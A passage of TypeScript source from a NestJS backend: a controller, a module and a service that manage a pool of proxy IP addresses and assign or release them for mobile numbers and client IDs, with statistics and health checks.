with filters' })\r\n    // @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number to search for' })\r\n    // @ApiQuery({ name: 'ipAddress', required: false, description: 'IP address to search for' })\r\n    // @ApiQuery({ name: 'clientId', required: false, description: 'Client ID to search for' })\r\n    // @ApiQuery({ name: 'status', required: false, description: 'Status', enum: ['active', 'inactive'] })\r\n    // @ApiOkResponse({ description: 'Search results', type: [IpMobileMapping] })\r\n    // async searchMappings(@Query() searchDto: SearchIpMobileMappingDto): Promise<IpMobileMapping[]> {\r\n    //     try {\r\n    //         return await this.ipManagementService.searchMappings(searchDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    // Create mapping functionality disabled for simplification - use assign endpoint instead\r\n    // @Post('mappings')\r\n    // @ApiOperation({ summary: 'Create a new IP-mobile mapping' })\r\n    // @ApiBody({ type: CreateIpMobileMappingDto })\r\n    // @ApiOkResponse({ description: 'Mapping created successfully', type: IpMobileMapping })\r\n    // @ApiBadRequestResponse({ description: 'Invalid input data' })\r\n    // async createMapping(@Body() createMappingDto: CreateIpMobileMappingDto): Promise<IpMobileMapping> {\r\n    //     try {\r\n    //         return await this.ipManagementService.createIpMobileMapping(createMappingDto);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    @Get('mappings/mobile/:mobile/ip')\r\n    @ApiOperation({ summary: 'Get IP address assigned to a mobile number' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n    @ApiOkResponse({ description: 'IP address found' })\r\n    @ApiNotFoundResponse({ description: 'No IP assigned to this mobile' })\r\n    async getIpForMobile(@Param('mobile') mobile: string): Promise<{ mobile: string; ipAddress: string | null }> {\r\n        try {\r\n            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);\r\n            return { mobile, ipAddress };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    // ==================== IP ASSIGNMENT OPERATIONS ====================\r\n\r\n    @Post('assign')\r\n    @ApiOperation({ summary: 'Assign an IP to a mobile number' })\r\n    @ApiBody({ type: AssignIpToMobileDto })\r\n    @ApiOkResponse({ description: 'IP assigned successfully', type: IpMobileMapping })\r\n    @ApiBadRequestResponse({ description: 'Assignment failed' })\r\n    async assignIpToMobile(@Body() assignDto: AssignIpToMobileDto): Promise<IpMobileMapping> {\r\n        try {\r\n            return await this.ipManagementService.assignIpToMobile(assignDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Post('assign/bulk')\r\n    @ApiOperation({ summary: 'Bulk assign IPs to multiple mobile numbers' })\r\n    @ApiBody({ type: BulkAssignIpDto })\r\n    @ApiOkResponse({ description: 'Bulk assignment completed' })\r\n    async bulkAssignIps(@Body() bulkAssignDto: BulkAssignIpDto): Promise<{ assigned: number; failed: number; results: Array<{ mobile: string; ipAddress?: string; error?: string }> }> {\r\n        try {\r\n            return await this.ipManagementService.bulkAssignIpsToMobiles(bulkAssignDto);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Delete('assign/mobile/:mobile')\r\n    @ApiOperation({ summary: 'Release IP from a mobile number' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number' })\r\n    @ApiBody({ type: ReleaseIpFromMobileDto })\r\n    @ApiOkResponse({ description: 'IP released successfully' })\r\n    @ApiNotFoundResponse({ description: 'No IP assignment found for mobile' })\r\n    async releaseIpFromMobile(@Param('mobile') mobile: string, @Body() releaseDto: ReleaseIpFromMobileDto): Promise<{ message: string }> {\r\n        try {\r\n            releaseDto.mobile = mobile; // Ensure mobile from param is used\r\n            await this.ipManagementService.releaseIpFromMobile(releaseDto);\r\n            return { message: 'IP released successfully' };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    // ==================== CLIENT-SPECIFIC OPERATIONS ====================\r\n\r\n    // Get client IPs functionality temporarily disabled for simplification\r\n    // @Get('clients/:clientId/ips')\r\n    // @ApiOperation({ summary: 'Get all IPs assigned to a client' })\r\n    // @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    // @ApiOkResponse({ description: 'Client IPs retrieved successfully', type: [ProxyIp] })\r\n    // async getClientIps(@Param('clientId') clientId: string): Promise<ProxyIp[]> {\r\n    //     try {\r\n    //         return await this.ipManagementService.getClientIps(clientId);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    @Get('clients/:clientId/mappings')\r\n    @ApiOperation({ summary: 'Get all mobile mappings for a client' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiOkResponse({ description: 'Client mappings retrieved successfully', type: [IpMobileMapping] })\r\n    async getClientMappings(@Param('clientId') clientId: string): Promise<IpMobileMapping[]> {\r\n        try {\r\n            return await this.ipManagementService.getClientMobileMappings(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    // Dedicated IP assignment functionality temporarily disabled for simplification\r\n    // @Post('clients/:clientId/assign-dedicated')\r\n    // @ApiOperation({ summary: 'Assign dedicated IPs to a client' })\r\n    // @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    // @ApiBody({ type: [String], description: 'Array of IP addresses in format ip:port' })\r\n    // @ApiOkResponse({ description: 'Dedicated IPs assignment completed' })\r\n    // async assignDedicatedIpsToClient(\r\n    //     @Param('clientId') clientId: string,\r\n    //     @Body() ipAddresses: string[]\r\n    // ): Promise<{ assigned: number; failed: number; errors: string[] }> {\r\n    //     try {\r\n    //         return await this.ipManagementService.assignDedicatedIpsToClient(clientId, ipAddresses);\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    //     }\r\n    // }\r\n\r\n    // ==================== STATISTICS & MAINTENANCE ====================\r\n\r\n    @Get('statistics')\r\n    @ApiOperation({ summary: 'Get IP management statistics' })\r\n    @ApiOkResponse({ description: 'Statistics retrieved successfully' })\r\n    async getStatistics(): Promise<{\r\n        total: number;\r\n        available: number;\r\n        assigned: number;\r\n        inactive: number;\r\n        mappings: {\r\n            total: number;\r\n            active: number;\r\n            inactive: number;\r\n        };\r\n    }> {\r\n        try {\r\n            return await this.ipManagementService.getStats();\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    @Get('health')\r\n    @ApiOperation({ summary: 'Get IP management health status' })\r\n    @ApiOkResponse({ description: 'Health status retrieved successfully' })\r\n    async getHealthStatus(): Promise<{\r\n        status: 'healthy' | 'warning' | 'critical';\r\n        availableIps: number;\r\n        totalActiveIps: number;\r\n        utilizationRate: number;\r\n        issues: string[];\r\n    }> {\r\n        try {\r\n            return await this.ipManagementService.healthCheck();\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    @Get('proxy-ips/:ipAddress/:port')\r\n    @ApiOperation({ summary: 'Get a specific proxy IP' })\r\n    @ApiParam({ name: 'ipAddress', description: 'IP address' })\r\n    @ApiParam({ name: 'port', description: 'Port number' })\r\n    @ApiOkResponse({ description: 'Proxy IP found', type: ProxyIp })\r\n    @ApiNotFoundResponse({ description: 'Proxy IP not found' })\r\n    async getProxyIpById(@Param('ipAddress') ipAddress: string, @Param('port') port: string): Promise<ProxyIp> {\r\n        try {\r\n            return await this.ipManagementService.findProxyIpById(ipAddress, parseInt(port));\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n        }\r\n    }\r\n\r\n    @Get('clients/:clientId/assigned-ips')\r\n    @ApiOperation({ summary: 'Get all IPs assigned to a client' })\r\n    @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n    @ApiOkResponse({ description: 'Client assigned IPs retrieved successfully', type: [ProxyIp] })\r\n    async getClientAssignedIps(@Param('clientId') clientId: string): Promise<ProxyIp[]> {\r\n        try {\r\n            return await this.ipManagementService.getClientAssignedIps(clientId);\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n        }\r\n    }\r\n\r\n    @Get('available-count')\r\n    @ApiOperation({ summary: 'Get count of available IPs' })\r\n    @ApiOkResponse({ description: 'Available IP count retrieved successfully' })\r\n    async getAvailableIpCount(): Promise<{ count: number }> {\r\n        try {\r\n            const count = await this.ipManagementService.getAvailableIpCount();\r\n            return { count };\r\n        } catch (error) {\r\n            throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n    // Cleanup functionality temporarily disabled for simplification\r\n    // @Post('maintenance/cleanup-expired')\r\n    // @ApiOperation({ summary: 'Clean up expired IP mappings' })\r\n    // @ApiOkResponse({ description: 'Cleanup completed' })\r\n    // async cleanupExpiredMappings(): Promise<{ message: string; cleanedCount: number }> {\r\n    //     try {\r\n    //         const cleanedCount = await this.ipManagementService.cleanupExpiredMappings();\r\n    //         return { message: 'Cleanup completed', cleanedCount };\r\n    //     } catch (error) {\r\n    //         throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    //     }\r\n    // }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { IpManagementController } from './ip-management.controller';\r\nimport { IpManagementService } from './ip-management.service';\r\nimport { ClientIpIntegrationService } from './client-ip-integration.service';\r\nimport { ClientIpIntegrationController } from './client-ip-integration.controller';\r\nimport { ProxyIp, ProxyIpSchema } from './schemas/proxy-ip.schema';\r\nimport { IpMobileMapping, IpMobileMappingSchema } from './schemas/ip-mobile-mapping.schema';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\r\n\r\n@Module({\r\n    imports: [\r\n        MongooseModule.forFeature([\r\n            { name: ProxyIp.name, schema: ProxyIpSchema },\r\n            { name: IpMobileMapping.name, schema: IpMobileMappingSchema }\r\n        ]),\r\n        forwardRef(() => ClientModule),\r\n        forwardRef(() => PromoteClientModule)\r\n    ],\r\n    controllers: [IpManagementController, ClientIpIntegrationController],\r\n    providers: [IpManagementService, ClientIpIntegrationService],\r\n    exports: [IpManagementService, ClientIpIntegrationService]\r\n})\r\nexport class IpManagementModule {}\r\n","import { Injectable, Logger, NotFoundException, BadRequestException, ConflictException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { ProxyIp, ProxyIpDocument } from './schemas/proxy-ip.schema';\r\nimport { IpMobileMapping, IpMobileMappingDocument } from './schemas/ip-mobile-mapping.schema';\r\nimport { CreateProxyIpDto } from './dto/create-proxy-ip.dto';\r\nimport { UpdateProxyIpDto } from './dto/update-proxy-ip.dto';\r\nimport { AssignIpToMobileDto, BulkAssignIpDto, ReleaseIpFromMobileDto } from './dto/assign-ip.dto';\r\n\r\n@Injectable()\r\nexport class IpManagementService {\r\n    private readonly logger = new Logger(IpManagementService.name);\r\n\r\n    constructor(\r\n        @InjectModel(ProxyIp.name) private proxyIpModel: Model<ProxyIpDocument>,\r\n        @InjectModel(IpMobileMapping.name) private ipMobileMappingModel: Model<IpMobileMappingDocument>\r\n    ) {}\r\n\r\n    // ==================== PROXY IP MANAGEMENT ====================\r\n\r\n    async createProxyIp(createProxyIpDto: CreateProxyIpDto): Promise<ProxyIp> {\r\n        // Input validation\r\n        if (!createProxyIpDto.ipAddress || !createProxyIpDto.port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        if (createProxyIpDto.port < 1 || createProxyIpDto.port > 65535) {\r\n            throw new BadRequestException('Port must be between 1 and 65535');\r\n        }\r\n\r\n        this.logger.debug(`Creating new proxy IP: ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}`);\r\n\r\n        try {\r\n            // Check if IP:Port combination already exists\r\n            const existingIp = await this.proxyIpModel.findOne({\r\n                ipAddress: createProxyIpDto.ipAddress,\r\n                port: createProxyIpDto.port\r\n            });\r\n\r\n            if (existingIp) {\r\n                throw new ConflictException(`Proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port} already exists`);\r\n            }\r\n\r\n            const createdIp = new this.proxyIpModel(createProxyIpDto);\r\n            const savedIp = await createdIp.save();\r\n\r\n            this.logger.log(`Created proxy IP: ${savedIp.ipAddress}:${savedIp.port}`);\r\n            return savedIp.toJSON();\r\n        } catch (error) {\r\n            if (error instanceof ConflictException || error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            this.logger.error(`Failed to create proxy IP ${createProxyIpDto.ipAddress}:${createProxyIpDto.port}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to create proxy IP: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async bulkCreateProxyIps(proxyIps: CreateProxyIpDto[]): Promise<{ created: number; failed: number; errors: string[] }> {\r\n        if (!proxyIps || proxyIps.length === 0) {\r\n            throw new BadRequestException('No proxy IPs provided for bulk creation');\r\n        }\r\n\r\n        this.logger.debug(`Bulk creating ${proxyIps.length} proxy IPs`);\r\n\r\n        let created = 0;\r\n        let failed = 0;\r\n        const errors: string[] = [];\r\n\r\n        // Process in batches to avoid overwhelming the database\r\n        const batchSize = 10;\r\n        for (let i = 0; i < proxyIps.length; i += batchSize) {\r\n            const batch = proxyIps.slice(i, i + batchSize);\r\n            \r\n            for (const ipDto of batch) {\r\n                try {\r\n                    // Validate each IP before creating\r\n                    if (!ipDto.ipAddress || !ipDto.port) {\r\n                        failed++;\r\n                        errors.push(`Invalid IP data: missing address or port`);\r\n                        continue;\r\n                    }\r\n\r\n                    await this.createProxyIp(ipDto);\r\n                    created++;\r\n                } catch (error) {\r\n                    failed++;\r\n                    errors.push(`${ipDto.ipAddress}:${ipDto.port} - ${error.message}`);\r\n                }\r\n            }\r\n        }\r\n\r\n        this.logger.log(`Bulk creation completed: ${created} created, ${failed} failed`);\r\n        return { created, failed, errors };\r\n    }\r\n\r\n    async findAllProxyIps(): Promise<ProxyIp[]> {\r\n        return this.proxyIpModel.find().lean();\r\n    }\r\n\r\n    async getAvailableProxyIps(): Promise<ProxyIp[]> {\r\n        return this.proxyIpModel.find({\r\n            status: 'active',\r\n            isAssigned: false\r\n        }).lean();\r\n    }\r\n\r\n    async updateProxyIp(ipAddress: string, port: number, updateDto: UpdateProxyIpDto): Promise<ProxyIp> {\r\n        this.logger.debug(`Updating proxy IP: ${ipAddress}:${port}`);\r\n\r\n        const updatedIp = await this.proxyIpModel.findOneAndUpdate(\r\n            { ipAddress, port },\r\n            { $set: updateDto },\r\n            { new: true }\r\n        ).lean();\r\n\r\n        if (!updatedIp) {\r\n            throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n        }\r\n\r\n        this.logger.log(`Updated proxy IP: ${ipAddress}:${port}`);\r\n        return updatedIp;\r\n    }\r\n\r\n    async deleteProxyIp(ipAddress: string, port: number): Promise<void> {\r\n        this.logger.debug(`Deleting proxy IP: ${ipAddress}:${port}`);\r\n\r\n        // Check if IP is currently assigned to any mobile\r\n        const mapping = await this.ipMobileMappingModel.findOne({\r\n            ipAddress: `${ipAddress}:${port}`,\r\n            status: 'active'\r\n        });\r\n\r\n        if (mapping) {\r\n            throw new BadRequestException(`Cannot delete IP ${ipAddress}:${port} - it is currently assigned to mobile ${mapping.mobile}`);\r\n        }\r\n\r\n        const result = await this.proxyIpModel.deleteOne({ ipAddress, port });\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n        }\r\n\r\n        this.logger.log(`Deleted proxy IP: ${ipAddress}:${port}`);\r\n    }\r\n\r\n    // ==================== IP-MOBILE MAPPING MANAGEMENT ====================\r\n\r\n    async getIpForMobile(mobile: string): Promise<string | null> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        this.logger.debug(`Getting IP for mobile: ${mobile}`);\r\n\r\n        try {\r\n            const mapping = await this.ipMobileMappingModel.findOne({\r\n                mobile: mobile.trim(),\r\n                status: 'active'\r\n            }).lean();\r\n\r\n            return mapping ? mapping.ipAddress : null;\r\n        } catch (error) {\r\n            this.logger.error(`Error getting IP for mobile ${mobile}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get IP for mobile: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async assignIpToMobile(assignDto: AssignIpToMobileDto): Promise<IpMobileMapping> {\r\n        // Input validation\r\n        if (!assignDto.mobile || assignDto.mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n        if (!assignDto.clientId || assignDto.clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        const mobile = assignDto.mobile.trim();\r\n        const clientId = assignDto.clientId.trim();\r\n\r\n        this.logger.debug(`Assigning IP to mobile: ${mobile}`);\r\n\r\n        try {\r\n            // Check if mobile already has IP assigned\r\n            const existingMapping = await this.ipMobileMappingModel.findOne({\r\n                mobile,\r\n                status: 'active'\r\n            });\r\n\r\n            if (existingMapping) {\r\n                this.logger.debug(`Mobile ${mobile} already has IP: ${existingMapping.ipAddress}`);\r\n                return existingMapping;\r\n            }\r\n\r\n            let selectedIp: ProxyIp;\r\n\r\n            if (assignDto.preferredIp) {\r\n                // Use specific IP if provided\r\n                const [ipAddress, portStr] = assignDto.preferredIp.split(':');\r\n                const port = parseInt(portStr);\r\n\r\n                if (isNaN(port)) {\r\n                    throw new BadRequestException(`Invalid port in preferred IP: ${assignDto.preferredIp}`);\r\n                }\r\n\r\n                selectedIp = await this.proxyIpModel.findOne({\r\n                    ipAddress,\r\n                    port,\r\n                    status: 'active',\r\n                    isAssigned: false\r\n                }).lean();\r\n\r\n                if (!selectedIp) {\r\n                    throw new NotFoundException(`Preferred IP ${assignDto.preferredIp} not available`);\r\n                }\r\n            } else {\r\n                // Auto-assign available IP with retry logic to handle race conditions\r\n                let retries = 3;\r\n                while (retries > 0 && !selectedIp) {\r\n                    selectedIp = await this.proxyIpModel.findOne({\r\n                        status: 'active',\r\n                        isAssigned: false\r\n                    }).lean();\r\n\r\n                    if (!selectedIp) {\r\n                        break;\r\n                    }\r\n\r\n                    // Try to atomically assign this IP\r\n                    const updateResult = await this.proxyIpModel.updateOne(\r\n                        { \r\n                            ipAddress: selectedIp.ipAddress, \r\n                            port: selectedIp.port,\r\n                            isAssigned: false \r\n                        },\r\n                        { \r\n                            $set: { \r\n                                isAssigned: true, \r\n                                assignedToClient: clientId \r\n                            } \r\n                        }\r\n                    );\r\n\r\n                    if (updateResult.modifiedCount === 0) {\r\n                        // Someone else took this IP, try again\r\n                        selectedIp = null;\r\n                        retries--;\r\n                        continue;\r\n                    }\r\n                    break;\r\n                }\r\n\r\n                if (!selectedIp) {\r\n                    throw new NotFoundException('No available proxy IPs');\r\n                }\r\n            }\r\n\r\n            // Create mapping\r\n            const mappingDto = {\r\n                mobile,\r\n                ipAddress: `${selectedIp.ipAddress}:${selectedIp.port}`,\r\n                clientId,\r\n                status: 'active'\r\n            };\r\n\r\n            let newMapping: IpMobileMappingDocument;\r\n\r\n            if (assignDto.preferredIp) {\r\n                // For preferred IP, we need to update both mapping and IP in transaction-like manner\r\n                const [mapping] = await Promise.all([\r\n                    this.ipMobileMappingModel.create(mappingDto),\r\n                    this.proxyIpModel.updateOne(\r\n                        { ipAddress: selectedIp.ipAddress, port: selectedIp.port },\r\n                        { $set: { isAssigned: true, assignedToClient: clientId } }\r\n                    )\r\n                ]);\r\n                newMapping = mapping;\r\n            } else {\r\n                // For auto-assign, IP is already updated, just create mapping\r\n                newMapping = await this.ipMobileMappingModel.create(mappingDto);\r\n            }\r\n\r\n            this.logger.log(`Assigned IP ${mappingDto.ipAddress} to mobile ${mobile}`);\r\n            return newMapping.toObject ? newMapping.toObject() : newMapping as IpMobileMapping;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to assign IP to mobile ${mobile}: ${error.message}`);\r\n            if (error instanceof NotFoundException || error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new BadRequestException(`Failed to assign IP to mobile: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async bulkAssignIpsToMobiles(bulkDto: BulkAssignIpDto): Promise<{\r\n        assigned: number;\r\n        failed: number;\r\n        results: Array<{ mobile: string; ipAddress?: string; error?: string }>\r\n    }> {\r\n        if (!bulkDto.mobiles || bulkDto.mobiles.length === 0) {\r\n            throw new BadRequestException('No mobiles provided for bulk assignment');\r\n        }\r\n        if (!bulkDto.clientId || bulkDto.clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required for bulk assignment');\r\n        }\r\n\r\n        this.logger.debug(`Bulk assigning IPs to ${bulkDto.mobiles.length} mobiles`);\r\n\r\n        let assigned = 0;\r\n        let failed = 0;\r\n        const results: Array<{ mobile: string; ipAddress?: string; error?: string }> = [];\r\n\r\n        // Process in smaller batches to manage database load\r\n        const batchSize = 5;\r\n        for (let i = 0; i < bulkDto.mobiles.length; i += batchSize) {\r\n            const batch = bulkDto.mobiles.slice(i, i + batchSize);\r\n            \r\n            for (const mobile of batch) {\r\n                if (!mobile || mobile.trim() === '') {\r\n                    failed++;\r\n                    results.push({ mobile: mobile || 'undefined', error: 'Invalid mobile number' });\r\n                    continue;\r\n                }\r\n\r\n                try {\r\n                    const assignDto: AssignIpToMobileDto = {\r\n                        mobile: mobile.trim(),\r\n                        clientId: bulkDto.clientId.trim()\r\n                    };\r\n\r\n                    const mapping = await this.assignIpToMobile(assignDto);\r\n                    assigned++;\r\n                    results.push({ mobile: mobile.trim(), ipAddress: mapping.ipAddress });\r\n                } catch (error) {\r\n                    failed++;\r\n                    results.push({ mobile: mobile.trim(), error: error.message });\r\n                    this.logger.warn(`Failed to assign IP to mobile ${mobile}: ${error.message}`);\r\n                }\r\n            }\r\n        }\r\n\r\n        this.logger.log(`Bulk assignment completed: ${assigned} assigned, ${failed} failed`);\r\n        return { assigned, failed, results };\r\n    }\r\n\r\n    async releaseIpFromMobile(releaseDto: ReleaseIpFromMobileDto): Promise<void> {\r\n        if (!releaseDto.mobile || releaseDto.mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        const mobile = releaseDto.mobile.trim();\r\n        this.logger.debug(`Releasing IP from mobile: ${mobile}`);\r\n\r\n        try {\r\n            const mapping = await this.ipMobileMappingModel.findOne({\r\n                mobile,\r\n                status: 'active'\r\n            });\r\n\r\n            if (!mapping) {\r\n                throw new NotFoundException(`No active IP mapping found for mobile: ${mobile}`);\r\n            }\r\n\r\n            const [ipAddress, portStr] = mapping.ipAddress.split(':');\r\n            const port = parseInt(portStr);\r\n\r\n            if (isNaN(port)) {\r\n                this.logger.error(`Invalid port in IP address: ${mapping.ipAddress}`);\r\n                throw new BadRequestException(`Invalid IP address format: ${mapping.ipAddress}`);\r\n            }\r\n\r\n            // Release IP and update mapping atomically\r\n            await Promise.all([\r\n                this.ipMobileMappingModel.updateOne(\r\n                    { mobile, status: 'active' },\r\n                    { $set: { status: 'inactive' } }\r\n                ),\r\n                this.proxyIpModel.updateOne(\r\n                    { ipAddress, port },\r\n                    { $set: { isAssigned: false }, $unset: { assignedToClient: 1 } }\r\n                )\r\n            ]);\r\n\r\n            this.logger.log(`Released IP ${mapping.ipAddress} from mobile ${mobile}`);\r\n        } catch (error) {\r\n            if (error instanceof NotFoundException || error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to release IP from mobile: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async getClientMobileMappings(clientId: string): Promise<IpMobileMapping[]> {\r\n        if (!clientId || clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        try {\r\n            return this.ipMobileMappingModel.find({\r\n                clientId: clientId.trim(),\r\n                status: 'active'\r\n            }).lean();\r\n        } catch (error) {\r\n            this.logger.error(`Error getting client mappings for ${clientId}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get client mappings: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async getStats(): Promise<{\r\n        total: number;\r\n        available: number;\r\n        assigned: number;\r\n        inactive: number;\r\n        mappings: {\r\n            total: number;\r\n            active: number;\r\n            inactive: number;\r\n        };\r\n    }> {\r\n        try {\r\n            const [total, available, assigned, inactive, totalMappings, activeMappings, inactiveMappings] = await Promise.all([\r\n                this.proxyIpModel.countDocuments(),\r\n                this.proxyIpModel.countDocuments({ status: 'active', isAssigned: false }),\r\n                this.proxyIpModel.countDocuments({ isAssigned: true }),\r\n                this.proxyIpModel.countDocuments({ status: 'inactive' }),\r\n                this.ipMobileMappingModel.countDocuments(),\r\n                this.ipMobileMappingModel.countDocuments({ status: 'active' }),\r\n                this.ipMobileMappingModel.countDocuments({ status: 'inactive' })\r\n            ]);\r\n\r\n            return { \r\n                total, \r\n                available, \r\n                assigned, \r\n                inactive,\r\n                mappings: {\r\n                    total: totalMappings,\r\n                    active: activeMappings,\r\n                    inactive: inactiveMappings\r\n                }\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Error getting statistics: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get statistics: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // ==================== ADDITIONAL UTILITY METHODS ====================\r\n\r\n    /**\r\n     * Get specific proxy IP by address and port\r\n     */\r\n    async findProxyIpById(ipAddress: string, port: number): Promise<ProxyIp> {\r\n        if (!ipAddress || !port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        try {\r\n            const proxyIp = await this.proxyIpModel.findOne({ ipAddress, port }).lean();\r\n            if (!proxyIp) {\r\n                throw new NotFoundException(`Proxy IP ${ipAddress}:${port} not found`);\r\n            }\r\n            return proxyIp;\r\n        } catch (error) {\r\n            if (error instanceof NotFoundException) {\r\n                throw error;\r\n            }\r\n            this.logger.error(`Error finding proxy IP ${ipAddress}:${port}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to find proxy IP: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get all IPs assigned to a specific client\r\n     */\r\n    async getClientAssignedIps(clientId: string): Promise<ProxyIp[]> {\r\n        if (!clientId || clientId.trim() === '') {\r\n            throw new BadRequestException('Client ID is required');\r\n        }\r\n\r\n        try {\r\n            return this.proxyIpModel.find({\r\n                assignedToClient: clientId.trim(),\r\n                isAssigned: true\r\n            }).lean();\r\n        } catch (error) {\r\n            this.logger.error(`Error getting assigned IPs for client ${clientId}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to get assigned IPs: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Find mobile mapping by mobile number\r\n     */\r\n    async findMappingByMobile(mobile: string): Promise<IpMobileMapping | null> {\r\n        if (!mobile || mobile.trim() === '') {\r\n            throw new BadRequestException('Mobile number is required');\r\n        }\r\n\r\n        try {\r\n            return this.ipMobileMappingModel.findOne({\r\n                mobile: mobile.trim(),\r\n                status: 'active'\r\n            }).lean();\r\n        } catch (error) {\r\n            this.logger.error(`Error finding mapping for mobile ${mobile}: ${error.message}`);\r\n            throw new BadRequestException(`Failed to find mapping: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Check if an IP is available for assignment\r\n     */\r\n    async isIpAvailable(ipAddress: string, port: number): Promise<boolean> {\r\n        if (!ipAddress || !port) {\r\n            throw new BadRequestException('IP address and port are required');\r\n        }\r\n\r\n        try {\r\n            const ip = await this.proxyIpModel.findOne({\r\n                ipAddress,\r\n                port,\r\n                status: 'active',\r\n                isAssigned: false\r\n            }).lean();\r\n\r\n            return ip !== null;\r\n        } catch (error) {\r\n            this.logger.error(`Error checking IP availability ${ipAddress}:${port}: ${error.message}`);\r\n            return false;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get available IP count\r\n     */\r\n    async getAvailableIpCount(): Promise<number> {\r\n        try {\r\n            return this.proxyIpModel.countDocuments({\r\n                status: 'active',\r\n                isAssigned: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(`Error getting available IP count: ${error.message}`);\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Health check method to validate IP pool status\r\n     */\r\n    async healthCheck(): Promise<{\r\n        status: 'healthy' | 'warning' | 'critical';\r\n        availableIps: number;\r\n        totalActiveIps: number;\r\n        utilizationRate: number;\r\n        issues: string[];\r\n    }> {\r\n        try {\r\n            const stats = await this.getStats();\r\n            const issues: string[] = [];\r\n            \r\n            const utilizationRate = stats.total > 0 ? (stats.assigned / stats.total) * 100 : 0;\r\n\r\n            let status: 'healthy' | 'warning' | 'critical' = 'healthy';\r\n\r\n            if (stats.available === 0) {\r\n                status = 'critical';\r\n                issues.push('No available IPs in pool');\r\n            } else if (stats.available < 5) {\r\n                status = 'warning';\r\n                issues.push('Low IP availability (less than 5 IPs available)');\r\n            }\r\n\r\n            if (utilizationRate > 90) {\r\n                status = utilizationRate > 95 ? 'critical' : 'warning';\r\n                issues.push(`High utilization rate: ${utilizationRate.toFixed(1)}%`);\r\n            }\r\n\r\n            if (stats.inactive > stats.total * 0.2) {\r\n                status = 'warning';\r\n            